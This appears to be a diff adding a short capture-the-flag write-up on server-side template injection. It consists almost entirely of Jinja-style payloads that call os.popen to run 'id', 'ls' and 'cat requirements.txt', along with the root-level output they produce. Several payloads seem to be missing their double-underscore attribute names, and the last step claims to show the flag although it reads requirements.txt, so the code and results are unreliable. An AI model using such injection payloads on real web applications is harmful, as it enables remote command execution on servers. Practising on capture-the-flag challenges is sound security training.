@@ -1,0 +1,12 @@
+CTF-SSTI1
+Past = {{request.application.globals.builtins.import('os').popen('id').read()}}
+
+After it show the result >>> uid=0(root) gid=0(root) groups=0(root)
+
+Past = {{request.application.globals.builtins.import('os').popen('ls').read()}}
+
+Result >>> pycache app.py flag requirements.txt
+
+Past = {{request.application.globals.builtins.import('os').popen('cat requirements.txt').read()}}
+
+result >> show the flag
